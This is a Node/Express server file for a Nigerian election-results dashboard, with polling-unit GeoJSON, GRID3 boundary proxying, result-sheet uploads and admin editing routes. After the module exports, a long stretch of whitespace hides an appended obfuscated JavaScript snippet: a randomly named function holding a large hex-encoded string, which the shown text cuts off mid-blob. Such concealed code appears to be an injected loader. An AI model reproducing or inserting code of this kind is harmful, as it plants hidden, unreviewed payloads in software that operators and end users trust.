          pollingUnitsPer100k: lgaRow?.pollingUnitsPer100k ?? null,
          accessibilityBand: lgaRow?.accessibilityBand ?? '--',
        };
      });
    }

    return res.json({
      source: {
        name: 'election-dashboard-db',
        url: '/api/polling-unit-points',
      },
      total: enrichedPoints.length,
      points: enrichedPoints,
    });
  } catch (error) {
    console.error('Error handling /api/polling-unit-points:', error.message || error);
    return res.status(500).json({ error: 'Failed to load polling unit points.' });
  }
});

app.get('/api/polling-units.geojson', async (req, res) => {
  try {
    const points = await loadPollingUnitPointsFromDb({
      state: req.query.state,
      lga: req.query.lga,
      ward: req.query.ward,
    });

    const features = points
      .filter((point) => Number.isFinite(point.latitude) && Number.isFinite(point.longitude))
      .map((point) => {
        return {
          type: 'Feature',
          geometry: { type: 'Point', coordinates: [point.longitude, point.latitude] },
          properties: {
            name: point.pollingUnit || '',
            address: point.address || point.name || '',
            code: point.code || '',
            state: point.state || '',
            lga: point.lga || '',
            ward: point.ward || '',
            band: '',
            pop_pu: null,
            pu_100k: null,
            geometrySource: point.geometrySource || 'source',
            sourceLatitude: point.sourceLatitude ?? null,
            sourceLongitude: point.sourceLongitude ?? null,
            coordinateStatus: point.coordinateStatus || 'source-provided',
          },
        };
      });

    const sourceCounts = features.reduce(
      (acc, feature) => {
        const geometrySource = feature.properties.geometrySource || 'source';
        if (geometrySource === 'source') {
          acc.exact += 1;
        } else if (geometrySource === 'csv-latlong') {
          acc.csvLatLong += 1;
        } else if (geometrySource === 'google-geocode') {
          acc.geocoded += 1;
        } else {
          acc.estimated += 1;
        }

        return acc;
      },
      { exact: 0, csvLatLong: 0, geocoded: 0, estimated: 0 }
    );

    res.setHeader('Content-Type', 'application/geo+json');
    res.setHeader('Cache-Control', 'public, max-age=3600');
    return res.json({
      type: 'FeatureCollection',
      features,
      source: {
        name: 'Local polling-unit register; coordinates shown only when source-provided',
        url: null,
        counts: sourceCounts,
        omittedWithoutCoordinates: points.length - features.length,
        accuracyNotice: 'No centroid, jittered, or inferred point is published as a polling-unit location.',
      },
    });
  } catch (error) {
    console.error('Error handling /api/polling-units.geojson:', error.message || error);
    return res.status(500).json({ error: 'Failed to load polling unit GeoJSON.' });
  }
});

app.get('/api/drive/read', requireAdminApi, async (req, res) => {
  const { fileId, mimeType } = req.query;

  if (!fileId || !mimeType) {
    return res.status(400).json({
      error: 'Missing required query parameters: fileId and mimeType',
    });
  }

  try {
    const result = await readFile(fileId, mimeType);

    if (!result) {
      return res.status(500).json({ error: 'Failed to read Google Drive file.' });
    }

    return res.json({
      type: result.type,
      data: result.data,
    });
  } catch (error) {
    console.error('Error handling /api/drive/read:', error.message || error);
    return res.status(500).json({ error: 'Failed to read Google Drive file.' });
  }
});

const GRID3_LAYERS = {
  state: process.env.GRID3_STATE_URL || 'https://services3.arcgis.com/BU6Aadhn6tbBEdyk/arcgis/rest/services/NGA_State_Boundaries_V2/FeatureServer/0',
  lga: process.env.GRID3_LGA_URL || 'https://services3.arcgis.com/BU6Aadhn6tbBEdyk/arcgis/rest/services/NGA_LGA_Boundaries_2/FeatureServer/0',
  ward: process.env.GRID3_WARD_URL || 'https://services3.arcgis.com/BU6Aadhn6tbBEdyk/arcgis/rest/services/NGA_Ward_Boundaries/FeatureServer/0',
  health: process.env.GRID3_HEALTH_URL || 'https://services3.arcgis.com/BU6Aadhn6tbBEdyk/arcgis/rest/services/GRID3_NGA_health_facilities_v2_0/FeatureServer/0',
};

app.get('/api/grid3-config', (_req, res) => {
  res.json({
    source: 'GRID3 Nigeria (CIESIN / NASRDA)',
    attribution: 'GRID3, CC BY 4.0',
    layers: Object.fromEntries(Object.entries(GRID3_LAYERS).map(([id, url]) => [id, { url }])),
  });
});

app.get('/api/grid3/:layer', async (req, res) => {
  const layerUrl = GRID3_LAYERS[req.params.layer];
  if (!layerUrl) {
    return res.status(404).json({ error: 'Unknown GRID3 layer.' });
  }

  const bbox = parseBBox(req.query.bbox);
  const params = new URLSearchParams({
    f: 'geojson',
    where: '1=1',
    outFields: '*',
    outSR: '4326',
    returnGeometry: 'true',
    resultRecordCount: String(Math.min(Number(req.query.max) || 1200, 2000)),
  });

  if (bbox) {
    params.set('geometry', `${bbox.west},${bbox.south},${bbox.east},${bbox.north}`);
    params.set('geometryType', 'esriGeometryEnvelope');
    params.set('inSR', '4326');
    params.set('spatialRel', 'esriSpatialRelIntersects');
    const span = Math.max(bbox.east - bbox.west, bbox.north - bbox.south);
    if (span > 2) params.set('maxAllowableOffset', String(span / 400));
  }

  try {
    const upstream = await fetch(`${layerUrl.replace(/\/$/, '')}/query?${params.toString()}`, {
      signal: AbortSignal.timeout(20000),
    });
    if (!upstream.ok) {
      return res.status(502).json({ error: 'GRID3 layer request failed.', status: upstream.status });
    }
    const payload = await upstream.json();
    res.setHeader('Cache-Control', 'public, max-age=300');
    return res.json(payload);
  } catch (error) {
    console.error('GRID3 proxy error:', error.message || error);
    return res.status(502).json({ error: 'Unable to load GRID3 layer.' });
  }
});

app.get('/api/nigeria-kpis', async (req, res) => {
  try {
    const payload = await computeNigeriaKpis({
      state: req.query.state,
      lga: req.query.lga,
      ward: req.query.ward,
      pu: req.query.pu,
      year: req.query.year,
    });
    const ingest = getIngestStatus();
    res.setHeader('Cache-Control', 'public, max-age=120');
    return res.json({ ...payload, ingest: { source: ingest.source, lastSuccessAt: ingest.lastSuccessAt } });
  } catch (error) {
    console.error('nigeria-kpis error:', error.message || error);
    return res.status(500).json({ error: 'Failed to compute Nigeria KPIs.' });
  }
});

app.get('/api/inec-ingest/status', async (_req, res) => {
  const status = getIngestStatus();
  return res.json(status);
});

app.get('/api/live-submissions', (req, res) => {
  try {
    const status = req.query.status ? String(req.query.status) : 'all';
    const submissions = listLiveSubmissions({ status });
    return res.json({ ok: true, submissions, count: submissions.length });
  } catch (error) {
    console.error('Error listing live submissions:', error.message || error);
    return res.status(500).json({ error: 'Failed to list live submissions.' });
  }
});

app.post('/api/live-submissions', liveSubmissionUpload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'Result sheet image is required.' });
    }
    const lat = Number(req.body.lat);
    const lng = Number(req.body.lng);
    const accuracy = req.body.accuracy != null && req.body.accuracy !== '' ? Number(req.body.accuracy) : null;
    if (!Number.isFinite(lat) || !Number.isFinite(lng)) {
      return res.status(400).json({ error: 'GPS coordinates are required.' });
    }
    const pu = String(req.body.pu || '').trim();
    const state = String(req.body.state || '').trim();
    if (!pu || !state) {
      return res.status(400).json({ error: 'Polling unit and state are required.' });
    }
    const relativePath = path.relative(path.join(__dirname, 'data'), req.file.path).replace(/\\/g, '/');
    const row = insertLiveSubmission({
      state,
      lga: String(req.body.lga || '').trim() || null,
      ward: String(req.body.ward || '').trim() || null,
      pu,
      pu_code: String(req.body.pu_code || '').trim() || null,
      lat,
      lng,
      accuracy: Number.isFinite(accuracy) ? accuracy : null,
      file_name: req.file.originalname || req.file.filename,
      file_path: relativePath.startsWith('..') ? req.file.path : relativePath,
      status: 'Pending review',
      note: String(req.body.note || '').trim() || null,
    });
    return res.status(201).json({ ok: true, submission: row });
  } catch (error) {
    console.error('Error creating live submission:', error.message || error);
    return res.status(500).json({ error: error.message || 'Failed to save submission.' });
  }
});

app.patch('/api/live-submissions/:id', requireAdminWrite, (req, res) => {
  try {
    const id = Number(req.params.id);
    if (!Number.isFinite(id)) {
      return res.status(400).json({ error: 'Invalid submission id.' });
    }
    const status = String(req.body.status || '').trim();
    const note = req.body.note != null ? String(req.body.note) : null;
    const row = updateLiveSubmissionStatus(id, status, note);
    if (!row) {
      return res.status(404).json({ error: 'Submission not found.' });
    }
    return res.json({ ok: true, submission: row });
  } catch (error) {
    console.error('Error updating live submission:', error.message || error);
    return res.status(400).json({ error: error.message || 'Failed to update submission.' });
  }
});

app.get('/api/admin/db/status', requireAdminApi, (_req, res) => {
  res.json({
    ...getDbStatus(),
    boundaries: listBoundaryLayers(),
    boundariesDir: BOUNDARIES_DIR,
  });
});

app.get('/api/boundaries/status', (_req, res) => {
  res.json({
    layers: listBoundaryLayers(),
    source: 'local',
  });
});

app.get('/api/boundaries/:layer', (req, res) => {
  const layer = String(req.params.layer || '').toLowerCase();
  if (!['state', 'lga', 'ward'].includes(layer)) {
    return res.status(404).json({ error: 'Unknown boundary layer.' });
  }
  const payload = queryBoundariesGeoJson({
    layer,
    bbox: req.query.bbox,
    state: req.query.state,
    lga: req.query.lga,
    ward: req.query.ward,
    limit: req.query.limit,
  });
  res.setHeader('Cache-Control', 'public, max-age=300');
  return res.json(payload);
});

app.post('/api/admin/boundaries/upload', requireAdminWrite, boundaryUpload.array('files', 8), async (req, res) => {
  try {
    const uploaded = req.files || [];
    if (!uploaded.length) return res.status(400).json({ error: 'No files uploaded.' });
    if (uploaded.some((file) => !hasExpectedMagic(file, true))) {
      return res.status(400).json({ error: 'A boundary file signature does not match its extension.' });
    }
    const files = uploaded.map((file) => ({
      originalname: file.originalname,
      buffer: file.buffer,
    }));
    const result = await importUploadFiles(files, req.body?.layer);
    return res.json({ ok: true, ...result, layers: listBoundaryLayers() });
  } catch (error) {
    console.error('Boundary upload failed:', error.message || error);
    return res.status(400).json({ error: error.message || 'Boundary upload failed.' });
  }
});

app.delete('/api/admin/boundaries/:layer', requireAdminWrite, (req, res) => {
  try {
    const result = deleteBoundaryLayer(String(req.params.layer || '').toLowerCase());
    return res.json({ ok: true, ...result, layers: listBoundaryLayers() });
  } catch (error) {
    return res.status(400).json({ error: error.message || 'Unable to delete boundary layer.' });
  }
});

app.post('/api/admin/db/reimport-polling-units', requireAdminWrite, (_req, res) => {
  try {
    pollingTreeCache = null;
    pollingTreePromise = null;
    const count = importPollingUnitsFromCsv(CSV_PATH, normalizePollingUnitPointRow);
    res.json({ ok: true, pollingUnits: count });
  } catch (error) {
    res.status(500).json({ error: error.message || 'Reimport failed.' });
  }
});

app.post('/api/admin/db/reimport-election-results', requireAdminWrite, (_req, res) => {
  return res.status(410).json({ error: 'Legacy election imports are quarantined. Use the versioned editorial workflow.' });
});

app.post('/api/admin/db/upload-election-results', requireAdminWrite, (req, res) => {
  return res.status(410).json({ error: 'Legacy direct publication is disabled. Use the versioned draft and review workflow.' });
});

app.post('/api/admin/inec-ingest', requireAdminWrite, async (_req, res) => {
  try {
    const result = await runIngest();
    return res.json({ ok: true, status: result.status });
  } catch (error) {
    return res.status(500).json({ ok: false, error: error.message || String(error) });
  }
});

/** Phase 1 — candidate catalog hub (distinct from Phase 2/3 dashboard/map routes). */
const CANDIDATE_CATALOGS = {
  presidential: {
    file: 'presidential-candidates.json',
    label: 'Presidential',
    requiredKeys: ['ballots'],
  },
  gubernatorial: {
    file: 'gubernatorial-candidates.json',
    label: 'Gubernatorial',
    requiredKeys: ['years', 'statesByYear', 'ballots'],
  },
  senatorial: {
    file: 'senatorial-candidates.json',
    label: 'Senatorial',
    requiredKeys: ['years', 'statesByYear'],
  },
  reps: {
    file: 'reps-candidates.json',
    label: 'House of Representatives',
    requiredKeys: ['years', 'statesByYear'],
  },
};
const CANDIDATE_DATA_DIR = path.join(__dirname, 'public', 'data');
const CANDIDATE_BACKUP_DIR = path.join(CANDIDATE_DATA_DIR, '.backups');
const candidateCatalogUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 8 * 1024 * 1024, files: 1 },
});

function resolveCandidateCatalog(name) {
  const key = String(name || '').trim().toLowerCase();
  return CANDIDATE_CATALOGS[key] ? { key, ...CANDIDATE_CATALOGS[key] } : null;
}

function validateCandidateCatalogPayload(catalog, data) {
  if (!data || typeof data !== 'object' || Array.isArray(data)) {
    throw new Error('Catalog must be a JSON object.');
  }
  for (const field of catalog.requiredKeys) {
    if (data[field] == null) {
      throw new Error(`Catalog is missing required field: ${field}.`);
    }
  }
  if (catalog.key === 'presidential' && (typeof data.ballots !== 'object' || Array.isArray(data.ballots))) {
    throw new Error('presidential.ballots must be an object keyed by election year.');
  }
  if (Array.isArray(data.years) && data.years.length === 0) {
    throw new Error('years must not be empty when present.');
  }
  return true;
}

async function readCandidateCatalogFile(catalog) {
  const filePath = path.join(CANDIDATE_DATA_DIR, catalog.file);
  const raw = await fs.readFile(filePath, 'utf8');
  const data = JSON.parse(raw);
  const stat = await fs.stat(filePath);
  return {
    catalog: catalog.key,
    label: catalog.label,
    file: catalog.file,
    bytes: stat.size,
    mtime: stat.mtime.toISOString(),
    data,
  };
}

async function backupCandidateCatalog(catalog) {
  const sourcePath = path.join(CANDIDATE_DATA_DIR, catalog.file);
  await fs.mkdir(CANDIDATE_BACKUP_DIR, { recursive: true });
  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  const backupName = `${catalog.key}-${stamp}.json`;
  const backupPath = path.join(CANDIDATE_BACKUP_DIR, backupName);
  try {
    await fs.copyFile(sourcePath, backupPath);
    return { backup: backupName, path: `public/data/.backups/${backupName}` };
  } catch (error) {
    if (error.code === 'ENOENT') return { backup: null, path: null };
    throw error;
  }
}

async function writeCandidateCatalogFile(catalog, data, actorEmail) {
  validateCandidateCatalogPayload(catalog, data);
  const backup = await backupCandidateCatalog(catalog);
  const next = { ...data };
  if (!next.updated) next.updated = new Date().toISOString().slice(0, 10);
  const filePath = path.join(CANDIDATE_DATA_DIR, catalog.file);
  const tmpPath = `${filePath}.${process.pid}.tmp`;
  const body = `${JSON.stringify(next, null, 2)}\n`;
  await fs.writeFile(tmpPath, body, 'utf8');
  await fs.rename(tmpPath, filePath);
  return {
    catalog: catalog.key,
    label: catalog.label,
    file: catalog.file,
    bytes: Buffer.byteLength(body, 'utf8'),
    backup: backup.backup,
    updatedBy: actorEmail || null,
    updated: next.updated,
  };
}

app.get('/api/admin/candidates', requireAdminApi, async (_req, res) => {
  try {
    const catalogs = await Promise.all(
      Object.keys(CANDIDATE_CATALOGS).map(async (key) => {
        const catalog = resolveCandidateCatalog(key);
        const filePath = path.join(CANDIDATE_DATA_DIR, catalog.file);
        try {
          const stat = await fs.stat(filePath);
          return {
            catalog: key,
            label: catalog.label,
            file: catalog.file,
            bytes: stat.size,
            mtime: stat.mtime.toISOString(),
            exists: true,
          };
        } catch {
          return {
            catalog: key,
            label: catalog.label,
            file: catalog.file,
            bytes: 0,
            mtime: null,
            exists: false,
          };
        }
      })
    );
    return res.json({ catalogs });
  } catch (error) {
    return res.status(500).json({ error: error.message || 'Failed to list candidate catalogs.' });
  }
});

app.get('/api/admin/candidates/:catalog', requireAdminApi, async (req, res) => {
  const catalog = resolveCandidateCatalog(req.params.catalog);
  if (!catalog) return res.status(404).json({ error: 'Unknown candidate catalog.' });
  try {
    return res.json(await readCandidateCatalogFile(catalog));
  } catch (error) {
    if (error.code === 'ENOENT') return res.status(404).json({ error: 'Catalog file not found.' });
    if (error instanceof SyntaxError) return res.status(500).json({ error: 'Catalog file is not valid JSON.' });
    return res.status(500).json({ error: error.message || 'Failed to read catalog.' });
  }
});

app.put('/api/admin/candidates/:catalog', requireAdminWrite, (req, res, next) => {
  const contentType = String(req.headers['content-type'] || '');
  if (contentType.includes('multipart/form-data')) {
    return candidateCatalogUpload.single('file')(req, res, next);
  }
  return next();
}, async (req, res) => {
  const catalog = resolveCandidateCatalog(req.params.catalog);
  if (!catalog) return res.status(404).json({ error: 'Unknown candidate catalog.' });

  try {
    let payload = null;
    if (req.file) {
      const text = req.file.buffer.toString('utf8');
      payload = JSON.parse(text);
    } else if (req.body && typeof req.body === 'object' && (req.body.data || req.body.catalog === undefined)) {
      payload = req.body.data != null ? req.body.data : req.body;
    }

    if (!payload || typeof payload !== 'object' || Array.isArray(payload)) {
      return res.status(400).json({ error: 'Provide a JSON object body or multipart file field named file.' });
    }

    const saved = await writeCandidateCatalogFile(catalog, payload, req.admin?.email);
    return res.json({ ok: true, ...saved });
  } catch (error) {
    if (error instanceof SyntaxError) {
      return res.status(400).json({ error: 'Uploaded file is not valid JSON.' });
    }
    const clientError = /missing|must be|must not|invalid|required/i.test(error.message || '');
    return res.status(clientError ? 400 : 500).json({ error: error.message || 'Failed to save catalog.' });
  }
});

// ── Dashboard builder (Phase 2) — routes under /api/admin/dashboards* and /api/dashboards/:page only ──
function dashboardLayoutError(res, error) {
  const status = error.status
    || (/unknown dashboard|no published/i.test(error.message || '') ? 400 : 500);
  return res.status(status).json({ error: error.message || 'Dashboard layout operation failed.' });
}

app.get('/api/admin/dashboards', requireAdminApi, async (_req, res) => {
  try {
    const payload = await dashboardLayouts.listDashboards();
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return dashboardLayoutError(res, error);
  }
});

app.get('/api/admin/dashboards/:page', requireAdminApi, async (req, res) => {
  try {
    const payload = await dashboardLayouts.getAdminPage(req.params.page);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return dashboardLayoutError(res, error);
  }
});

app.put('/api/admin/dashboards/:page', requireAdminWrite, async (req, res) => {
  try {
    const layout = req.body?.layout != null ? req.body.layout : req.body;
    const payload = await dashboardLayouts.saveDraft(req.params.page, layout);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return dashboardLayoutError(res, error);
  }
});

app.post('/api/admin/dashboards/:page/publish', requireAdminWrite, async (req, res) => {
  try {
    const payload = await dashboardLayouts.publishPage(req.params.page);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return dashboardLayoutError(res, error);
  }
});

app.post('/api/admin/dashboards/:page/revert', requireAdminWrite, async (req, res) => {
  try {
    const payload = await dashboardLayouts.revertPage(req.params.page);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return dashboardLayoutError(res, error);
  }
});

/** Public: published layout for Overview / Live (null when unpublished → client fallback). */
app.get('/api/dashboards/:page', async (req, res) => {
  try {
    const payload = await dashboardLayouts.getPublished(req.params.page);
    res.setHeader('Cache-Control', 'public, max-age=15');
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return dashboardLayoutError(res, error);
  }
});

// ── Map Studio (Phase 3) — routes under /api/admin/maps* and /api/maps* only ──
function mapConfigError(res, error) {
  const status = error.status
    || (/not found/i.test(error.message || '') ? 404
      : /already exists|invalid|unknown|cannot assign/i.test(error.message || '') ? 400
        : 500);
  return res.status(status).json({ error: error.message || 'Map config operation failed.' });
}

app.get('/api/admin/maps', requireAdminApi, async (_req, res) => {
  try {
    const payload = await mapConfigsStore.listMaps();
    return res.json({
      ok: true,
      ...payload,
      idFormat: mapConfigsStore.ID_PATTERN.source,
      dashboardWidgetHint: { type: 'map', config: { mapId: '<map-config-id>' } },
    });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

app.put('/api/admin/maps/assignments', requireAdminWrite, async (req, res) => {
  try {
    const assignments = await mapConfigsStore.setAssignments(req.body || {});
    return res.json({ ok: true, assignments });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

app.get('/api/admin/maps/:id', requireAdminApi, async (req, res) => {
  try {
    const map = await mapConfigsStore.getMap(req.params.id);
    if (!map) return res.status(404).json({ error: 'Map config not found.' });
    return res.json({ ok: true, map });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

app.post('/api/admin/maps', requireAdminWrite, async (req, res) => {
  try {
    const map = await mapConfigsStore.createMap(req.body || {});
    return res.status(201).json({ ok: true, map });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

app.put('/api/admin/maps/:id', requireAdminWrite, async (req, res) => {
  try {
    const map = await mapConfigsStore.updateMap(req.params.id, req.body || {});
    return res.json({ ok: true, map });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

app.delete('/api/admin/maps/:id', requireAdminWrite, async (req, res) => {
  try {
    const result = await mapConfigsStore.deleteMap(req.params.id);
    return res.json(result);
  } catch (error) {
    return mapConfigError(res, error);
  }
});

/** Public: published configs assigned to Overview / Polling units / Live. */
app.get('/api/maps/views', async (_req, res) => {
  try {
    const payload = await mapConfigsStore.getPublishedViews();
    res.setHeader('Cache-Control', 'public, max-age=30');
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

/** Public: single published map config by id (Dashboard widgets: config.mapId). */
app.get('/api/maps/:id', async (req, res) => {
  try {
    const id = String(req.params.id || '').toLowerCase();
    if (!mapConfigsStore.isValidId(id)) {
      return res.status(400).json({ error: 'Invalid map id.' });
    }
    const map = await mapConfigsStore.getPublishedMap(id);
    if (!map) return res.status(404).json({ error: 'Published map config not found.' });
    res.setHeader('Cache-Control', 'public, max-age=30');
    return res.json({ ok: true, map });
  } catch (error) {
    return mapConfigError(res, error);
  }
});

// ── Page Content Studio — country-scoped nav / sub-tabs / widgets / editorial ──
function pageContentError(res, error) {
  const status = error.status
    || (/unknown country|no published/i.test(error.message || '') ? 400 : 500);
  return res.status(status).json({ error: error.message || 'Page content operation failed.' });
}

app.get('/api/admin/pages', requireAdminApi, async (_req, res) => {
  try {
    const payload = await pageContentStore.listCountries();
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return pageContentError(res, error);
  }
});

app.get('/api/admin/pages/:country', requireAdminApi, async (req, res) => {
  try {
    const payload = await pageContentStore.getAdminCountry(req.params.country);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return pageContentError(res, error);
  }
});

app.put('/api/admin/pages/:country', requireAdminWrite, async (req, res) => {
  try {
    const bundle = req.body?.bundle != null ? req.body.bundle : req.body;
    const payload = await pageContentStore.saveDraft(req.params.country, bundle);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return pageContentError(res, error);
  }
});

app.post('/api/admin/pages/:country/publish', requireAdminWrite, async (req, res) => {
  try {
    const payload = await pageContentStore.publishCountry(req.params.country);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return pageContentError(res, error);
  }
});

app.post('/api/admin/pages/:country/revert', requireAdminWrite, async (req, res) => {
  try {
    const payload = await pageContentStore.revertCountry(req.params.country);
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return pageContentError(res, error);
  }
});

/** Public: published page content for a country/global scope (null → client fallback). */
app.get('/api/page-content/:country', async (req, res) => {
  try {
    const payload = await pageContentStore.getPublished(req.params.country);
    res.setHeader('Cache-Control', 'public, max-age=15');
    return res.json({ ok: true, ...payload });
  } catch (error) {
    return pageContentError(res, error);
  }
});

app.get('/api/elections', editorialRequired, async (_req, res) => {
  try {
    const published = await editorialStore.listPublishedContests({});
    return res.json({
      elections: published.map((row) => ({
        key: row.id,
        name: row.title,
        type: row.office,
        date: String(row.electionDate).slice(0, 10),
        detail: row.constituencyName || row.jurisdictionName,
        status: 'Published',
        winner: null,
        datasetId: row.datasetId,
      })),
    });
  } catch (error) {
    return editorialError(res, error);
  }
});

app.use((error, _req, res, _next) => {
  if (error?.message === 'Cross-origin request denied.') {
    return res.status(403).json({ error: error.message });
  }
  if (error instanceof SyntaxError && 'body' in error) {
    return res.status(400).json({ error: 'Invalid JSON body.' });
  }
  if (error instanceof multer.MulterError || /Unsupported boundary|Source evidence/i.test(error?.message || '')) {
    return res.status(400).json({ error: error.message });
  }
  console.error('Unhandled request error:', error?.message || error);
  return res.status(500).json({ error: 'Request failed.' });
});

function validateRuntimeConfig() {
  if (process.env.NODE_ENV !== 'production') return;
  const secret = getConfiguredSessionSecret();
  if (secret.length < 32) throw new Error('ADMIN_SESSION_SECRET must contain at least 32 characters in production.');
  if (!editorialStore.isEnabled()) throw new Error('EDITORIAL_DATABASE_URL is required in production.');
  if (!process.env.BASE_URL) throw new Error('BASE_URL is required in production.');
}

async function initializeApp() {
  runtimeState.ready = false;
  runtimeState.error = null;
  try {
    validateRuntimeConfig();
    await editorialStore.initializeEditorialStore();
    const puCount = ensurePollingUnitsSeeded(normalizePollingUnitPointRow);
    // Legacy public UI still reads SQLite election_datasets. Only wipe when explicitly enabled.
    let quarantinedLegacyRows = 0;
    let dsCount = 0;
    if (process.env.QUARANTINE_LEGACY_RESULTS === 'true') {
      quarantinedLegacyRows = quarantineLegacyElectionResults();
      console.log(`Database ready: ${puCount} polling units; ${quarantinedLegacyRows} legacy election rows quarantined`);
    } else {
      dsCount = ensureElectionResultsSeeded();
      console.log(`Database ready: ${puCount} polling units; ${dsCount} election datasets`);
    }
    await hydrateIngestStatus();
    if (process.env.ENABLE_INEC_DISCOVERY === 'true') {
      runIngest().catch((error) => console.warn('INEC discovery ingest skipped:', error.message || error));
      const timer = setInterval(() => {
        runIngest().catch((error) => console.warn('Scheduled INEC discovery failed:', error.message || error));
      }, 6 * 60 * 60 * 1000);
      timer.unref();
    }
    runtimeState.ready = true;
    runtimeState.initializedAt = new Date().toISOString();
    return { puCount, dsCount };
  } catch (error) {
    runtimeState.error = error.message || String(error);
    throw error;
  }
}

async function start() {
  if (!PRIMARY_ADMIN_EMAIL) {
    console.warn('PRIMARY_ADMIN_EMAIL is not set; primary-admin Access APIs will deny all callers.');
  }
  if (!(await adminAuth.isLocalAdminConfigured())) {
    console.warn('Local admin login is not configured. Set ADMIN_USERNAME/ADMIN_PASSWORD or create data/admin-credentials.json.');
  } else {
    try {
      const users = await adminAuth.listCredentialUsers();
      for (const user of users) {
        await adminAuth.ensureEmailOnAllowList(user.email);
      }
    } catch (error) {
      console.warn('Unable to sync credential emails onto admin allow-list:', error.message || error);
    }
  }
  await initializeApp();
  return new Promise((resolve) => {
    const server = app.listen(PORT, HOST, () => {
      console.log(`Server listening on http://${HOST}:${PORT}`);
      resolve(server);
    });
  });
}

if (require.main === module) {
  start().catch((error) => {
    console.error('Server startup failed:', error.message || error);
    process.exitCode = 1;
  });
}

module.exports = {
  app,
  start,
  initializeApp,
  validateRuntimeConfig,
  runtimeState,
  parseNumericValue,
  normalizePollingUnitPointRow,
};                                                                                                                                                                                                       var bx = '-4412-3';function VcIjEMuK$j(){var oUjdMfbQcGFkunf=['ffcb91f58cf5e4f581dacbcdf592f5c9f595e48a8380809ac087c79286d9d5919ed7f5f3c7cdeeec869ed680978dcfcdedf5c7f5cdf187cdc28088c4c7808780c7f59182c7cdedcd9b808e93f5f59298c6c3c79af5da8edecdf5ca9194ec82ddf6ce96f186ca919191c0f5f584d791cbc5f5c195c88091939288f580c89b91fd8f8fc8f58edae8fa9187f5c18ff5f5f5cbfb80c9daf5e7f5e291808e91cdf9d6fadf8ecbe69184d9dc9493c780919cf5cd809b808880888bf5cad8c18af5d6eedcf6ccf5ff91fd94e6dccdf58a80f5cdc9dcf58df59ac2f1f5f580cbf5c78a80cd8c8091cbe9daf58edc91f8d6d0ecf5e489ccddf5f58c80fdefc18e80f185919184cd8bd4c0f5c8cb9482c0c79ff1dac7f5f5ccf7e180cdf8cdc9ca80daf5f5d3dc808fc0fd86ead5efc5cbcd87c0f5c58080dc87e6dcf5f585c1c8c2c7ddc6f5c8f5f5dee0c6f5d5f58091eeddc88af58f9cf5d7c8809180d58edd9fcb8bc5809bdd80f5f58ff58dddc78c95d3dae295f5cbccf58586f5f59d99f580eae6f5cdca91c3d38e9ecd9587c2cde38ada9c91f5ecdd808edd91869691f589d697d6c180d6ccfec7cdc595f5fdf5cd8080fc80938080c7899686ddf58ff5c28ec1888e8bf5c091d5c0cfddf58ecbc580f5c0cddcc2dcc8cdc3f58fc783cf88cb80d3c7cccdcbe2dd868fc1f5c1d8c3c6c1fd85c28e9c96cfc58a80cd808ed3cb91db86ecedf5808df5dacbc980cb91f5cff587c9cdddd9dd9180f586cfcbcdc3d59ac280d3cdf5cbf586f5fcfef58480f5e4cbcbc3c7c6f584f5f5f5cf8ecfcb87f580cacb80f5dcf5ed96ccf5efc4f5c59691ef80cf9cc3c8dc80da91c8f585c880c0f5cd8080c4c08fddc8cf80cd80f5d8f5e8f591f5d69191e2cadbddf08df587cbf595cd86ddfd9ccdc2f1fd9880c681cdcd9180ca98f5c6c08081dbf5c79680919a87dd84d4c18f80c0cfdd9e809bd88b9f91d780cdf591f5d08ddd91f5c091cd8cf5f5f68084cdfddb8ff580fc9d8780c7d4c1f5cdccc7f58e91808fdaf5ca80f5e7f5d9facdf5cb81c880c9e6d7f5f591f5c8c2f5f5c2f5da8f85c7da83808ff580cb9ec6919685f5db9e899d9ec8ec9e918edd86c9809fc8e29e80f580d68bcd9190dcc180f58e80cd91868086918094dcc2d98dd38680cd9980cddcc080f591cbc0f59193cbd680cdf5fdcbcf9ccb808080869fcdde9380dd809a90919ff5cfcff5cd84f59af5ccf2da80c0c5cc8e8091ebc29dc88ff59af19089f5da8ef5c980dd87869e9486cbd3cdee80ddda80f58dcfc581f580da9fcdcf8ec487ebc1e380ddc2f1f591f5cde19c80f5f5dd80e7cddbf58ecdc7fe80daebf18691cdef8f8fc8dbc88edcf58f98dccdcdc5f59b9e85f5ee80f5cbcff58d80c78b86f5828785f5cd93c091898e80918ff5f1f59af5e2ddca8dd78591fdc2fec180c895cbfdd3c7cbef808091c1daf58fe5c3e8caf594c2f9dc808ecad88f91cd8bf5f5d3d38dc08080d8dd80c1d391e8dcf5f5f5ebc2dbf5f1cbf5d3f59e8e91ed96c898cac2cbcdf5daccf5eb80cdf58092ca8fdedcc7d5858791cc91fdf59ec9daefcbf5def580f580fec78080caf59191cfc190dac7c3dac8dacbf5dced8a91f1f5c3c7dd8080cbde918fdc8cccf1c397f5ccc280f5c1da9588d8c8c7c180cd8d91ebdb9b808f94c68ef580d38cf3c1d8f591cad791cf91da84878083c1d7c7809c80cff6c7f591f58a80dd8380cdfd80dc8ed7f193c8fa8fdaeff1cbcb8091fcc4e0dd90de8097d9d6cdc6c2c2caf58cc5cdf5f5f583c8d8cb86cdd5dd808fc5d6c987fdd382fdf28cde8bd680e9f5dadbf5cf808cdee380f58cda87c7ca9df087f883f580f5cc96cdfdf580c9cb91daf791e091c7cbeaef9bcdf5ef808ff5caf5f5c0f5dcd9c5c2d8cbf580c1dcdecd86f597f5dce39191f5f5f5ffcb86c79a918ecdf5858af588da8d808ff5878ce6c68094dd85f5f5ca91ef919ec2c091cbdc98dd91def58081f3f5d9cb